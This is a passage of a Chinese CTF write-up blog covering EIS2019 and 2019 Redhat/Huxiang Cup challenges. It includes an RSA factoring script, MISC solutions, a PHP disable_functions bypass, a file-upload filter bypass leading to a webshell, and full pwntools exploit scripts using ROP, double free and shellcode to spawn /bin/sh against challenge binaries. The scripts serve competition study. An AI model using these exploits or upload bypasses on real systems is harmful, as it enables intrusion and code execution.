class="number">10</span>,<span class="number">400</span>)-pimul)/pow(<span class="number">10</span>,<span class="number">200</span>)</span><br><span class="line"><span class="comment">#print pjia2</span></span><br><span class="line">p2=pjia2*pjia2<span class="number">-4</span>*pimul*pimul<span class="comment"># (x^4+y^4-2x^2y^2)</span></span><br><span class="line">p2s=gmpy2.iroot(p2,<span class="number">2</span>)[<span class="number">0</span>]<span class="comment">#(x^2-y^2)</span></span><br><span class="line"><span class="comment">#print p2s</span></span><br><span class="line">pb200=gmpy2.iroot((pjia2+p2s)/<span class="number">2</span>,<span class="number">2</span>)[<span class="number">0</span>]<span class="comment">#x^2-y^2</span></span><br><span class="line">pe200=pimul/pb200</span><br><span class="line">p=pb200*pow(<span class="number">10</span>,<span class="number">200</span>)+pe200</span><br><span class="line"><span class="comment">#print p</span></span><br><span class="line">q=pe200*pow(<span class="number">10</span>,<span class="number">200</span>)+pb200</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">c=<span class="number">16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">plain=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(plain)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>f12发现可疑的东西</p><img src="/2019/11/21/EIS2019/1.png"><p>一个转成0一个转成1，再转字符串</p><img src="/2019/11/21/EIS2019/2.png"><h3 id="twocats"><a href="#twocats" class="headerlink" title="twocats"></a>twocats</h3><p>盲水印，现成脚本解码即可</p><img src="/2019/11/21/EIS2019/3.png"><h3 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h3><img src="/2019/11/21/EIS2019/4.png"><p>打开看到一串乱码结果，推测应该是某种特定编码或者编码转换的错误</p><p>在使用010 Editor和 WinHex查看以及放到Linux下改变编码都不可以</p><p>使用偏门编码逐一尝试，在使用EBCDIC编码时，成功看到flag</p><img src="/2019/11/21/EIS2019/5.png"><h3 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h3><p>进去看到python代码，稍作格式化整理 </p><img src="/2019/11/21/EIS2019/6.png"><p>这里注意到使用了open()函数打开了flag文件，然后把flag文件进行删除操作</p><p>但这里有个问题，由于采用了open文件操作函数，会导致在linux下中/dev/fd下生成进程文件描述符，而/dev/fd/3是读取文件系统的描述符，直接读取/dev/fd/3会把之前open的文件内容读取出来，除非当前进程被关闭后重新打开，这时候3中的内容才会改变（如果修改了flag）</p><p><a href="https://blog.csdn.net/zhangpeterx/article/details/90672749" target="_blank" rel="noopener">https://blog.csdn.net/zhangpeterx/article/details/90672749</a></p><p><a href="https://unix.stackexchange.com/questions/74454/somethings-special-about-dev-fd-3" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/74454/somethings-special-about-dev-fd-3</a></p><p><a href="http://www.tldp.org/LDP/abs/html/io-redirection.html" target="_blank" rel="noopener">http://www.tldp.org/LDP/abs/html/io-redirection.html</a></p><h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><p><strong>下载下来是个数据包，直接追踪**</strong>HTTP<strong>**流</strong></p><p>基本可以确定是被机密混淆的流量</p><p>这里编写正则提取出所有的chr中的十六进制字符，然后转换成字符串</p><img src="/2019/11/21/EIS2019/10.jpg"><p>这里提取的解密最后部分有点乱码，但不影响解密</p><p>这里对所有的数据包解密后，可以看到最后两个数据包涉及flag读取操作</p><img src="/2019/11/21/EIS2019/11.jpg"><img src="/2019/11/21/EIS2019/12.jpg"><p>上面的base64解码为/bin/sh</p><p>下面base64解码为cd “/var/www/html/tmp”;cat flag|base64 ;echo [S];pwd;echo [E]</p><img src="/2019/11/21/EIS2019/13.jpg"><p>可以看到最后一个数据包是flag读取响应包</p><p>其中AES的key可知为$key=’f5045b05abe6ec9b1e37fafa851f5de9’;</p><p>删掉前后的0897d  60c97 然后使用PHP的openssl直接解密即可</p><img src="/2019/11/21/EIS2019/14.jpg"><p>把最后一行</p><p>bm5ubm5ubm5ubm5ubm5ubm4KZmxhZ3tBbnRTd29yZF9pc19Qb3dlcmZ1bF8zMjIyMjIyISEhIX0K</p><p>Base64解密即可得到flag</p><img src="/2019/11/21/EIS2019/15.jpg"><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ezbypass"><a href="#Ezbypass" class="headerlink" title="Ezbypass"></a>Ezbypass</h3><p>这是最近的php7系列disable function bypass的题</p><p>把</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p><p>脚本进行修改</p><p>命令改写成 /readflag</p><p>然后部署到自己的服务器上面</p><img src="/2019/11/21/EIS2019/16.jpg"><img src="/2019/11/21/EIS2019/17.jpg"><p>直接部属到自己的服务器，然后远程读取，本地包含即可绕过disable function读到flag</p><h3 id="Ezupload"><a href="#Ezupload" class="headerlink" title="Ezupload"></a>Ezupload</h3><img src="/2019/11/21/EIS2019/19.jpg"><img src="/2019/11/21/EIS2019/20.jpg"><p>下载下来恢复看看</p><img src="/2019/11/21/EIS2019/21.jpg"><p>这里直接把username置为空 不发送password参数即可绕过限制</p><img src="/2019/11/21/EIS2019/22.jpg"><p>再上传界面 要求上传图片 这里bp抓包修改，但发现不能发送php文件</p><p>于是尝试phtml</p><p>发现要求图片，这里加上GIF89a标识，即可成功上传</p><img src="/2019/11/21/EIS2019/23.jpg"><img src="/2019/11/21/EIS2019/24.jpg"><p>直接蚁剑连上即可，在根目录执行readflag即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;Re&quot;&gt;&lt;a href=&quot;#Re&quot; class=&quot;headerlink&quot; title=&quot;Re&quot;&gt;&lt;/a&gt;Re&lt;/h2&gt;&lt;h3 id=&quot;re1&quot;&gt;&lt;a href=&quot;#re1&quot; class=&quot;headerlink&quot; title=&quot;re1&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="ctf wp" scheme="http://pidanxu.github.io/categories/ctf-wp/"/>
    
    
    <category term="eis2019" scheme="http://pidanxu.github.io/tags/eis2019/"/>
    
  </entry>
  
  <entry>
    <title>2019redhat</title>
    <link href="http://pidanxu.github.io/2019/11/10/2019redhat/"/>
    <id>http://pidanxu.github.io/2019/11/10/2019redhat/</id>
    <published>2019-11-10T14:33:21.000Z</published>
    <updated>2019-11-19T06:24:29.454Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="three"><a href="#three" class="headerlink" title="three"></a>three</h3><p>可以向一个RWX的内存区域写3个字节，之后会将该地址作为函数调用</p><img src="/2019/11/10/2019redhat/39.png"><p>同时我们还能够控制位于bss段的0x200个字节，首先想到的就是通过3字节将栈迁移到bss中，执行实现在bss中布置好的ROP链。</p><p>通过调试发现，在进入<code>rwx()</code>函数后，ecx中的值恰好为name变量的地址，这就可以很容易的构造栈迁移了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x89 0xcc  :mov esp, ecx</span><br><span class="line">0xc3       :ret</span><br></pre></td></tr></table></figure><p>所以用ROPgadget生成rop链，写到name处即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08072f8b</span>) <span class="comment"># pop edx ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080f5000</span>) <span class="comment"># @ .data </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080c11e6</span>) <span class="comment"># pop eax ; ret </span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080573e5</span>) <span class="comment"># mov dword ptr [edx], eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08072f8b</span>) <span class="comment"># pop edx ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080f5004</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080c11e6</span>) <span class="comment"># pop eax ; ret </span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080573e5</span>) <span class="comment"># mov dword ptr [edx], eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08072f8b</span>) <span class="comment"># pop edx ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080f5008</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080569a0</span>) <span class="comment"># xor eax, eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080573e5</span>) <span class="comment"># mov dword ptr [edx], eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481d9</span>) <span class="comment"># pop ebx ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080f5000</span>) <span class="comment"># @ .data </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08072fb2</span>) <span class="comment"># pop ecx ; pop ebx ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080f5008</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080f5000</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08072f8b</span>) <span class="comment"># pop edx ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080f5008</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080569a0</span>) <span class="comment"># xor eax, eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808041a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049903</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"47.104.190.38 "</span>, <span class="number">12001</span>)</span><br><span class="line">io.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'much!\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'\x89\xcc\xc3'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'500'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Tell me:\n'</span>)</span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="湖湘杯-hackNote"><a href="#湖湘杯-hackNote" class="headerlink" title="湖湘杯_hackNote"></a>湖湘杯_hackNote</h3><p>这道题漏洞在于edit函数中，因为字符串末尾没有<code>\x00</code>截断，导致在使用<code>strlen</code>重新计算长度时将下一chunk的size位一同计算进去，从而使新长度大于真实长度</p><img src="/2019/11/10/2019redhat/37.png"><p>以此就可以通过下一次edit覆盖溢出到下一chunk的size部分，从而构造出overlap。</p><p>因为是静态编译而且还有rwx权限，所以可以最后通过double free将chunk分配到<code>_fini_array</code>处，在附近写上shellcode，并在<code>_fini_array</code>填入shellcode的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./HackNote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Exit\n'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvline(<span class="string">'Size:\n'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Note:\n'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Exit\n'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note:\n'</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Exit\n'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note:\n'</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'Note:\n'</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">'0'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'0'</span>*<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x208</span>, <span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'0'</span>*<span class="number">0x1f0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'0'</span>*<span class="number">0x108</span> + <span class="string">'\x00\x02'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">'4'</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'2'</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">'6'</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">'7'</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0x80</span>)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x6cb828</span>))</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">'\x00'</span>*<span class="number">0x20</span> + p64(<span class="number">0x6caed8</span>)) </span><br><span class="line">payload = p64(<span class="number">0x6caef8</span>)*<span class="number">2</span> + <span class="string">"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"</span></span><br><span class="line">add(<span class="number">0x150</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="湖湘杯-NameSystem"><a href="#湖湘杯-NameSystem" class="headerlink" title="湖湘杯_NameSystem"></a>湖湘杯_NameSystem</h3><p>在remove函数中，每当删掉一个对象，会将指针数组中后面的元素依次向前复制一位。</p><img src="/2019/11/10/2019redhat/38.png"><p>但是当数组已经存满元素，再删除 除了第19号 的其他元素，因为并不存在<code>v[19] = v[20]</code>，就会导致v[19]没有清空，从而获得两个指向同一对象的指针，然后就可以任意构造double free了。</p><p>我的exp写的比较繁琐，构造了很多组double free，通过overlap修改chunksize并free来获得libc指针，通过改free_got为puts来泄露libc，然后one_gadgets写malloc_hook。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./NameSystem'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Name Size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Name:'</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'delete:'</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">构造第一个double free，chunk大小为0x60</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>)) <span class="comment"># 伪造一个chunk头在这</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'xx'</span>)<span class="comment"># chunkA 之后将分配一个chunk与它重合，用于泄露libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">19</span>)</span><br><span class="line">remove(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">5</span>) <span class="comment"># 0-4</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">构造第二个double free，chunk大小为0x40</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">5</span>)</span><br><span class="line">remove(<span class="number">5</span>)</span><br><span class="line">remove(<span class="number">19</span>)</span><br><span class="line">remove(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">remove(<span class="number">5</span>)</span><br><span class="line">remove(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">使用第二个构造的double free，用于将chunk分配到chunkA的地方</span></span><br><span class="line"><span class="string">这样就获得了两个指向同一chunk的指针，但是需要爆破，因为写\x20时实际写的是\x20\x00</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'\x20'</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'xxx'</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'xxx'</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'xxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">在使用再使用第二个构造的double free，将chunk分配到chunkA前面伪造好的chunk头处</span></span><br><span class="line"><span class="string">然后修改chunkA的size为0xa1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">remove(<span class="number">7</span>)</span><br><span class="line">remove(<span class="number">8</span>)</span><br><span class="line">remove(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'\x10'</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'xxx'</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'xxx'</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'\x00'</span>*<span class="number">8</span> + <span 